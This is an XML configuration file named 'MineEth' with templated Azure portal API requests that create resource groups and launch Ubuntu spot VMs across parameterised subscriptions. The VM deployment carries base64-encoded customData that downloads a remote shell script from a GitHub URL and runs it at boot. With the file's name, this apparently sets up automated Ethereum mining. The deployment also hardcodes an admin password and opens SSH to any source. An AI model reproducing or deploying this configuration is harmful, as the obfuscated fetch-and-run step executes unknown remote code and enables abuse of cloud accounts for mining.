<?xml version="1.0"?>
<azure id = "MineEth">          
           
    <setting id = "GROUP">
        {"requests":[{"content":{"name":"az701vb","location":"eastus","tags":{}},"httpMethod":"PUT","name":"204bb87a-3034-4ad4-9e65-87680d{RANDOM}","requestHeaderDetails":{"commandName":"HubsExtension.Deploy.createRG"},"url":"/subscriptions/{SUBID}/resourceGroups/az701vb?api-version=2014-04-01-preview"}]}                      
    </setting>
         
    <setting id = "CREATE">           
        {
        "requests": [
        {
        "content": {
        "properties": {
        "mode": "incremental",
        "debugSetting": {
        "detailLevel": "none"
        },
        "parameters": {
        "location": {
        "value": "{LOCATION}"
        },
        "networkInterfaceName": {
        "value": "{VMNAME}178"
        },
        "enableAcceleratedNetworking": {
        "value": true
        },
        "networkSecurityGroupName": {
        "value": "{VMNAME}-nsg"
        },
        "networkSecurityGroupRules": {
        "value": [
        {
        "name": "SSH",
        "properties": {
        "priority": 300,
        "protocol": "TCP",
        "access": "Allow",
        "direction": "Inbound",
        "sourceAddressPrefix": "*",
        "sourcePortRange": "*",
        "destinationAddressPrefix": "*",
        "destinationPortRange": "22"
        }
        }
        ]
        },
        "subnetName": {
        "value": "default"
        },
        "virtualNetworkName": {
        "value": "az701vb-vnet"
        },
        "addressPrefixes": {
        "value": [
        "10.0.0.0/16"
        ]
        },
        "subnets": {
        "value": [
        {
        "name": "default",
        "properties": {
        "addressPrefix": "10.0.0.0/24"
        }
        }
        ]
        },
        "publicIpAddressName": {
        "value": "{VMNAME}-ip"
        },
        "publicIpAddressType": {
        "value": "Dynamic"
        },
        "publicIpAddressSku": {
        "value": "Basic"
        },
        "pipDeleteOption": {
        "value": "Detach"
        },
        "virtualMachineName": {
        "value": "{VMNAME}"
        },
        "virtualMachineComputerName": {
        "value": "{VMNAME}"
        },
        "virtualMachineRG": {
        "value": "az701vb"
        },
        "osDiskType": {
        "value": "Premium_LRS"
        },
        "osDiskDeleteOption": {
        "value": "Delete"
        },
        "virtualMachineSize": {
        "value": "{VMSIZE}"
        },
        "nicDeleteOption": {
        "value": "Detach"
        },
        "adminUsername": {
        "value": "azureuser"
        },
        "adminPassword": {
        "value": "ToiLAi12345u0021@nu"
        },
        "customData": {
        "value": "IyEvYmluL2Jhc2gKd2dldCAtTyB4eHguc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RodWNuaDk2YnVja2V0L3J0bS9tYWluL2RvY2tlcmZpbGUuc2ggJiYgY2htb2QgK3ggeHh4LnNoICYmIGJhc2ggLi94eHguc2g="
        }
        },
        "template": {
        "$schema": "http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
        "contentVersion": "1.0.0.0",
        "parameters": {
        "location": {
        "type": "string"
        },
        "networkInterfaceName": {
        "type": "string"
        },
        "enableAcceleratedNetworking": {
        "type": "bool"
        },
        "networkSecurityGroupName": {
        "type": "string"
        },
        "networkSecurityGroupRules": {
        "type": "array"
        },
        "subnetName": {
        "type": "string"
        },
        "virtualNetworkName": {
        "type": "string"
        },
        "addressPrefixes": {
        "type": "array"
        },
        "subnets": {
        "type": "array"
        },
        "publicIpAddressName": {
        "type": "string"
        },
        "publicIpAddressType": {
        "type": "string"
        },
        "publicIpAddressSku": {
        "type": "string"
        },
        "pipDeleteOption": {
        "type": "string"
        },
        "virtualMachineName": {
        "type": "string"
        },
        "virtualMachineComputerName": {
        "type": "string"
        },
        "virtualMachineRG": {
        "type": "string"
        },
        "osDiskType": {
        "type": "string"
        },
        "osDiskDeleteOption": {
        "type": "string"
        },
        "virtualMachineSize": {
        "type": "string"
        },
        "nicDeleteOption": {
        "type": "string"
        },
        "adminUsername": {
        "type": "string"
        },
        "adminPassword": {
        "type": "secureString"
        },
        "customData": {
        "type": "secureString"
        }
        },
        "variables": {
        "nsgId": "[resourceId(resourceGroup().name, 'Microsoft.Network/networkSecurityGroups', parameters('networkSecurityGroupName'))]",
        "vnetName": "[parameters('virtualNetworkName')]",
        "vnetId": "[resourceId(resourceGroup().name,'Microsoft.Network/virtualNetworks', parameters('virtualNetworkName'))]",
        "subnetRef": "[concat(variables('vnetId'), '/subnets/', parameters('subnetName'))]"
        },
        "resources": [
        {
        "name": "[parameters('networkInterfaceName')]",
        "type": "Microsoft.Network/networkInterfaces",
        "apiVersion": "2021-03-01",
        "location": "[parameters('location')]",
        "dependsOn": [
        "[concat('Microsoft.Network/networkSecurityGroups/', parameters('networkSecurityGroupName'))]",
        "[concat('Microsoft.Network/virtualNetworks/', parameters('virtualNetworkName'))]",
        "[concat('Microsoft.Network/publicIpAddresses/', parameters('publicIpAddressName'))]"
        ],
        "properties": {
        "ipConfigurations": [
        {
        "name": "ipconfig1",
        "properties": {
        "subnet": {
        "id": "[variables('subnetRef')]"
        },
        "privateIPAllocationMethod": "Dynamic",
        "publicIpAddress": {
        "id": "[resourceId(resourceGroup().name, 'Microsoft.Network/publicIpAddresses', parameters('publicIpAddressName'))]",
        "properties": {
        "deleteOption": "[parameters('pipDeleteOption')]"
        }
        }
        }
        }
        ],
        "enableAcceleratedNetworking": "[parameters('enableAcceleratedNetworking')]",
        "networkSecurityGroup": {
        "id": "[variables('nsgId')]"
        }
        }
        },
        {
        "name": "[parameters('networkSecurityGroupName')]",
        "type": "Microsoft.Network/networkSecurityGroups",
        "apiVersion": "2019-02-01",
        "location": "[parameters('location')]",
        "properties": {
        "securityRules": "[parameters('networkSecurityGroupRules')]"
        }
        },
        {
        "name": "[parameters('virtualNetworkName')]",
        "type": "Microsoft.Network/virtualNetworks",
        "apiVersion": "2020-11-01",
        "location": "[parameters('location')]",
        "properties": {
        "addressSpace": {
        "addressPrefixes": "[parameters('addressPrefixes')]"
        },
        "subnets": "[parameters('subnets')]"
        }
        },
        {
        "name": "[parameters('publicIpAddressName')]",
        "type": "Microsoft.Network/publicIpAddresses",
        "apiVersion": "2019-02-01",
        "location": "[parameters('location')]",
        "properties": {
        "publicIpAllocationMethod": "[parameters('publicIpAddressType')]"
        },
        "sku": {
        "name": "[parameters('publicIpAddressSku')]"
        }
        },
        {
        "name": "[parameters('virtualMachineName')]",
        "type": "Microsoft.Compute/virtualMachines",
        "apiVersion": "2021-07-01",
        "location": "[parameters('location')]",
        "dependsOn": [
        "[concat('Microsoft.Network/networkInterfaces/', parameters('networkInterfaceName'))]"
        ],
        "properties": {
        "hardwareProfile": {
        "vmSize": "[parameters('virtualMachineSize')]"
        },
        "storageProfile": {
        "osDisk": {
        "createOption": "fromImage",
        "managedDisk": {
        "storageAccountType": "[parameters('osDiskType')]"
        },
        "deleteOption": "[parameters('osDiskDeleteOption')]"
        },
        "imageReference": {
        "publisher": "Canonical",
        "offer": "UbuntuServer",
        "sku": "18_04-lts-gen2",
        "version": "latest"
        }
        },
        "networkProfile": {
        "networkInterfaces": [
        {
        "id": "[resourceId('Microsoft.Network/networkInterfaces', parameters('networkInterfaceName'))]",
        "properties": {
        "deleteOption": "[parameters('nicDeleteOption')]"
        }
        }
        ]
        },
        "osProfile": {
        "computerName": "[parameters('virtualMachineComputerName')]",
        "adminUsername": "[parameters('adminUsername')]",
        "adminPassword": "[parameters('adminPassword')]",
        "linuxConfiguration": {
        "patchSettings": {
        "patchMode": "ImageDefault"
        }
        },
        "customData": "[parameters('customData')]"
        },
        "priority": "Spot",
        "evictionPolicy": "Deallocate",
        "billingProfile": {
        "maxPrice": -1
        },
        "diagnosticsProfile": {
        "bootDiagnostics": {
        "enabled": true
        }
        }
        }
        }
        ],
        "outputs": {
        "adminUsername": {
        "type": "string",
        "value": "[parameters('adminUsername')]"
        }
        }
        }
        },
        "tags": {
        "primaryResourceId": "/subscriptions/{SUBID}/resourcegroups/az701vb/providers/Microsoft.Compute/virtualMachines/{VMNAME}",
        "marketplaceItemId": "Microsoft.VirtualMachine",
        "provisioningHash": "SolutionProvider"
        }
        },
        "httpMethod": "POST",
        "name": "12bf161a-ab95-43f1-8f9a-c0c7{RANDOM}ae",
        "requestHeaderDetails": {
        "commandName": "Microsoft_Azure_Compute.Deploy.validate"
        },
        "url": "/subscriptions/{SUBID}/resourceGroups/az701vb/providers/Microsoft.Resources/deployments/CreateVm-Canonical.UbuntuServer-18_04-lts-gen2-20220330121309/validate?api-version=2020-06-01"
        }
        ]
        }
                      
    </setting>
        
    <setting id = "LIST">
        {"requests":[{"content":{"query":"Resources\n    | where type =~ 'microsoft.compute/virtualMachines'\n    | extend nics=array_length(properties.networkProfile.networkInterfaces)\n    | mvexpand nic=properties.networkProfile.networkInterfaces limit 400\n    | where nics == 1 or nic.properties.primary =~ 'true' or isempty(nic)\n    | project\n        id = tolower(id),\n        name,\n        resourceGroup,\n        type,\n        kind,\n        location,\n        edgeZone = iff(tostring(extendedLocation.type) =~ 'EdgeZone', tostring(extendedLocation.name), '{{Resource noContent, Module=ComputeResources}}'),\n        subscriptionId,\n        tags,\n        licenseType=case(\n            properties.licenseType =~ 'Windows_Server', '{{Resource ColumnName.LicensingBenefit.ahb, Module=ComputeResources}}',\n            properties.licenseType =~ 'Windows_Client', '{{Resource ColumnName.LicensingBenefit.multiTenant, Module=ComputeResources}}',\n            properties.licenseType =~ 'RHEL_BYOS', '{{Resource ColumnName.LicensingBenefit.redhat, Module=ComputeResources}}',\n            properties.licenseType =~ 'SLES_BYOS', '{{Resource ColumnName.LicensingBenefit.suse, Module=ComputeResources}}',\n            '{{Resource notEnabled, Module=ComputeResources}}'\n        ),\n        nics = coalesce(tostring(nics), '{{Resource noContent, Module=ComputeResources}}'),\n        zones = coalesce(tostring(zones[0]), '{{Resource noContent, Module=ComputeResources}}'),\n        os = case(\n            properties.storageProfile.osDisk.osType =~ 'Windows', '{{Resource windowsOperatingSystem, Module=ComputeResources}}',\n            properties.storageProfile.osDisk.osType =~ 'Linux', '{{Resource linuxOperatingSystem, Module=ComputeResources}}',\n            '{{Resource noContent, Module=ComputeResources}}'\n        ),\n        publisher = coalesce(\n            tostring(properties.storageProfile.imageReference.publisher),\n            '{{Resource noContent, Module=ComputeResources}}'\n        ),\n        offer = coalesce(\n            tostring(properties.storageProfile.imageReference.offer),\n            '{{Resource noContent, Module=ComputeResources}}'\n        ),\n        sku = coalesce(\n            tostring(properties.storageProfile.imageReference.sku),\n            '{{Resource noContent, Module=ComputeResources}}'\n        ),\n        usesManagedDisks = iff(\n            isnotempty(properties.storageProfile.osDisk.managedDisk), '{{Resource yes, Module=ComputeResources}}',\n            '{{Resource no, Module=ComputeResources}}'\n        ),\n        disks = coalesce(\n            tostring(\n                iff(isnotempty(properties.storageProfile.osDisk) and isnotnull(properties.storageProfile.osDisk), 1, 0) + coalesce(array_length(properties.storageProfile.dataDisks), 0)\n            ),\n            '{{Resource noContent, Module=ComputeResources}}'\n        ),\n        source = coalesce(\n            case(\n                (isnotnull(properties.storageProfile.imageReference.publisher) and isnotempty(properties.storageProfile.imageReference.publisher)), '{{Resource Browse.ImageType.marketplace, Module=ComputeResources}}',\n                (isnotnull(properties.storageProfile.imageReference.id) and isnotempty(properties.storageProfile.imageReference.id) and properties.storageProfile.imageReference contains \"Microsoft.Compute/images\"), '{{Resource Browse.ImageType.image, Module=ComputeResources}}',\n                (isnotnull(properties.storageProfile.imageReference.id) and isnotempty(properties.storageProfile.imageReference.id) and properties.storageProfile.imageReference contains \"Microsoft.Compute/galleries\"), '{{Resource Browse.ImageType.sharedImage, Module=ComputeResources}}',\n                '{{Resource Browse.ImageType.disk, Module=ComputeResources}}'\n            ),\n            '{{Resource noContent, Module=ComputeResources}}'\n        ),\n        spotEvictionPolicy = case(\n            (properties.priority =~ \"Low\" or properties.priority =~ \"Spot\") and properties.evictionPolicy =~ \"Deallocate\", '{{Resource AzureSpot.stopDeallocate, Module=ComputeResources}}',\n            (properties.priority =~ \"Low\" or properties.priority =~ \"Spot\"), '{{Resource AzureSpot.delete, Module=ComputeResources}}',\n            '{{Resource noContent, Module=ComputeResources}}'\n        ),\n        spotEvictionType = case(\n            (properties.priority =~ \"Low\" or properties.priority =~ \"Spot\") and properties.billingProfile.maxPrice == -1, '{{Resource AzureSpot.onDemand, Module=ComputeResources}}',\n            (properties.priority =~ \"Low\" or properties.priority =~ \"Spot\"), '{{Resource AzureSpot.maxPrice, Module=ComputeResources}}',\n            '{{Resource noContent, Module=ComputeResources}}'\n        ),\n        spotPrice = case(\n            (properties.priority =~ \"Low\" or properties.priority =~ \"Spot\") and isnotnull(properties.billingProfile.maxPrice) and isnotempty(properties.billingProfile.maxPrice) and properties.billingProfile.maxPrice u0021= -1, strcat(\"$ \", round(toreal(properties.billingProfile.maxPrice), 2)),\n            (properties.priority =~ \"Low\" or properties.priority =~ \"Spot\") and (isnull(properties.billingProfile.maxPrice) or isempty(properties.billingProfile.maxPrice)), '{{Resource AzureSpot.onDemand, Module=ComputeResources}}',\n            '{{Resource noContent, Module=ComputeResources}}'\n        ),\n        proximityPlacementGroup = coalesce(extract('/proximityPlacementGroups/(.*)', 1, tostring(properties.proximityPlacementGroup.id)), '{{Resource noContent, Module=ComputeResources}}'),\n        host = coalesce(extract('/hosts/(.*)', 1, tostring(properties.host.id)), '{{Resource noContent, Module=ComputeResources}}'),\n        availabilitySet = coalesce(extract('/availabilitySets/(.*)', 1, tostring(properties.availabilitySet.id)), '{{Resource noContent, Module=ComputeResources}}'),\n        vmSize = coalesce(tostring(properties.hardwareProfile.vmSize), '{{Resource noContent, Module=ComputeResources}}'),\n        computerName = coalesce(tostring(properties.osProfile.computerName), '{{Resource noContent, Module=ComputeResources}}'),\n        hyperVGeneration = coalesce(tostring(properties.extended.instanceView.hyperVGeneration), '{{Resource noContent, Module=ComputeResources}}'),\n        securityType = case(\n            isnull(properties.securityProfile.securityType) or (properties.securityProfile.securityType =~ \"Standard\"), '{{Resource TrustedVm.standard, Module=ComputeResources}}',\n            properties.securityProfile.securityType =~ \"TrustedLaunch\", '{{Resource TrustedVm.trustedLaunch, Module=ComputeResources}}',\n            properties.securityProfile.securityType =~ \"ConfidentialVm\", '{{Resource TrustedVm.confidential, Module=ComputeResources}}',\n            '{{Resource noContent, Module=ComputeResources}}'\n        ),\n        nicId = tostring(tolower(nic.id)),\n        powerState = tostring(split(tolower(properties.extended.instanceView.powerState.code), \"powerstate/\")[1]),\n        provisioningState = tostring(properties.provisioningState),\n        scaleSet = coalesce(extract('/virtualMachineScaleSets/(.*)', 1, tostring(properties.virtualMachineScaleSet.id)), '{{Resource noContent, Module=ComputeResources}}')\n    | join kind=leftouter hint.strategy=shuffle (Resources\n            | where type =~ 'Microsoft.Network/networkInterfaces'\n            | extend ipConfigsCount=array_length(properties.ipConfigurations)\n            | mvexpand ipconfig=properties.ipConfigurations limit 400\n            | where ipConfigsCount == 1 or ipconfig.properties.primary =~ 'true'\n            | parse kind=regex tostring(ipconfig.properties.subnet.id) with '/virtualNetworks/' virtualNetwork '/subnets/' subnet\n            | project\n                nicId=tolower(id),\n                publicIpId=tostring(ipconfig.properties.publicIPAddress.id),\n                privateIPAddress=tostring(ipconfig.properties.privateIPAddress),\n                subnet,\n                virtualNetwork,\n                lbReferences=array_concat(\n                    ipconfig.properties.loadBalancerInboundNatRules,\n                    ipconfig.properties.loadBalancerBackendAddressPools,\n                    ipconfig.properties.applicationGatewayBackendAddressPools))\n        on nicId\n    | project-away nicId, nicId1\n    | mvexpand lbRef=lbReferences limit 400\n    | extend lbId=tolower(extract('(.*)/(inboundNatRules|backendAddressPool)', 1, tostring(lbRef.id)))\n    | summarize tags = any(tags) by id, lbId, name, resourceGroup, type, kind, location, subscriptionId, licenseType, nics, zones, os, usesManagedDisks, publicIpId, disks, source, spotEvictionPolicy, spotEvictionType, spotPrice, proximityPlacementGroup, host, availabilitySet, vmSize, securityType, privateIPAddress, subnet, virtualNetwork, powerState, provisioningState, scaleSet, edgeZone, computerName, hyperVGeneration, publisher, offer, sku\n    | join kind=leftouter hint.strategy=shuffle (Resources\n            | where type =~ 'microsoft.network/loadbalancers' or type =~ 'microsoft.network/applicationgateways'\n            | mvexpand fipc=properties.frontendIPConfigurations limit 400\n            | summarize lbPublicIpId=any(tostring(fipc.properties.publicIPAddress.id)) by lbId=tolower(id))\n        on lbId\n    | summarize lbPublicIpId=any(lbPublicIpId), tags = any(tags) by id, name, resourceGroup, type, kind, location, subscriptionId, licenseType, nics, zones, os, usesManagedDisks, publicIpId, disks, source, spotEvictionPolicy, spotEvictionType, spotPrice, proximityPlacementGroup, host, availabilitySet, vmSize, securityType, privateIPAddress, subnet, virtualNetwork, powerState, provisioningState, scaleSet, edgeZone, computerName, hyperVGeneration, publisher, offer, sku\n    | extend publicIpId=tolower(iff(isnotempty(publicIpId), publicIpId, lbPublicIpId))\n    | project-away lbPublicIpId\n    | join kind=leftouter hint.strategy=shuffle (Resources\n            | where type =~ 'microsoft.network/publicipaddresses'\n            | project publicIpId=tolower(id), publicIpAddress=tostring(properties.ipAddress), publicDnsName=tostring(properties.dnsSettings.fqdn))\n        on publicIpId\n    | project-away publicIpId, publicIpId1\n    | project id,\n        name,\n        resourceGroup,\n        type,\n        kind,\n        location,\n        subscriptionId,\n        tags,\n        nics,\n        os,\n        publisher,\n        offer,\n        sku,\n        status = case(\n            provisioningState =~ 'CREATING', '{{Resource VM.Status.creating, Module=Resources}}',\n            provisioningState =~ 'DELETING', '{{Resource VM.Status.deleting, Module=Resources}}',\n            (provisioningState =~ 'FAILED' and isnotnull(powerState) and isnotempty(powerState)), case(\n                powerState =~ 'RUNNING', '{{Resource VM.Status.running, Module=Resources}}',\n                powerState =~ 'STOPPED', '{{Resource VM.Status.stopped, Module=Resources}}',\n                powerState =~ 'DEALLOCATED', '{{Resource VM.Status.deallocated, Module=Resources}}',\n                '{{Resource VM.Status.unknown, Module=Resources}}'\n            ),\n            provisioningState =~ 'FAILED', '{{Resource VM.Status.failed, Module=Resources}}',\n            (provisioningState =~ 'SUCCEEDED' and isnotnull(powerState) and isnotempty(powerState)), case(\n                powerState =~ 'RUNNING', '{{Resource VM.Status.running, Module=Resources}}',\n                powerState =~ 'STOPPED', '{{Resource VM.Status.stopped, Module=Resources}}',\n                powerState =~ 'DEALLOCATED', '{{Resource VM.Status.deallocated, Module=Resources}}',\n                powerState =~ 'STARTING', '{{Resource VM.Status.starting, Module=Resources}}',\n                '{{Resource VM.Status.unknown, Module=Resources}}'\n            ),\n            (provisioningState =~ 'UPDATING' and isnotnull(powerState) and isnotempty(powerState)), case(\n                powerState =~ 'DEALLOCATING', '{{Resource VM.Status.deallocating, Module=Resources}}',\n                powerState =~ 'RUNNING', '{{Resource VM.Status.running, Module=Resources}}',\n                powerState =~ 'STARTING', '{{Resource VM.Status.starting, Module=Resources}}',\n                powerState =~ 'STOPPING', '{{Resource VM.Status.stopping, Module=Resources}}',\n                '{{Resource VM.Status.updating, Module=Resources}}'\n            ),\n            '{{Resource VM.Status.unknown, Module=Resources}}'\n        ),\n        disks,\n        availabilitySet,\n        vmSize,\n        securityType,\n        virtualNetwork = coalesce(virtualNetwork, '{{Resource noContent, Module=ComputeResources}}'),\n        subnet = coalesce(subnet, '{{Resource noContent, Module=ComputeResources}}'),\n        privateIPAddress = coalesce(privateIPAddress, '{{Resource noContent, Module=ComputeResources}}'),\n        publicDnsName = coalesce(publicDnsName, '{{Resource noContent, Module=ComputeResources}}'),\n        publicIpAddress = coalesce(publicIpAddress, '{{Resource noContent, Module=ComputeResources}}'),\n        zones,\n        usesManagedDisks,\n        licenseType,\n        source,\n        spotEvictionPolicy,\n        spotEvictionType,\n        spotPrice,\n        proximityPlacementGroup,\n        host,\n        scaleSet = coalesce(scaleSet, '{{Resource noContent, Module=ComputeResources}}'),\n        edgeZone = coalesce(edgeZone, '{{Resource noContent, Module=ComputeResources}}'),\n        computerName,\n        hyperVGeneration\n    | join kind=leftouter hint.strategy=shuffle (HealthResources\n            | project id = tostring(properties.targetResourceId),\n                vmAvailabilityState = tostring(properties.availabilityState),\n                targetResourceType = tostring(properties.targetResourceType)\n            | where targetResourceType =~ 'Microsoft.Compute/virtualMachines'\n            | project-away targetResourceType)\n        on id\n    | project-away id1","options":{"$top":100,"$skip":0,"$skipToken":"","dataset":"Simulated"},"subscriptions":["{SUBID}"]},"httpMethod":"POST","name":"504406c1-ee1e-488c-95a5-909b9378a00c","requestHeaderDetails":{"commandName":"HubsExtension.PhantomArgQuery.VMBrowseWithHealth"},"url":"https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2018-09-01-preview"}]}
    </setting>
        
    <setting id = "START">
        {"requests":[{"httpMethod":"POST","name":"eff7cfeb-f7c0-4bcd-8c7b-804386{RANDOM}","requestHeaderDetails":{"commandName":"HubsExtension.Microsoft.Compute/VirtualMachines.BulkStart.execute"},"url":"/subscriptions/{SUBID}/resourceGroups/nnnnnn/providers/Microsoft.Compute/virtualMachines/{VMNAME}/start?api-version=2019-07-01"}]}
    </setting>
</azure>
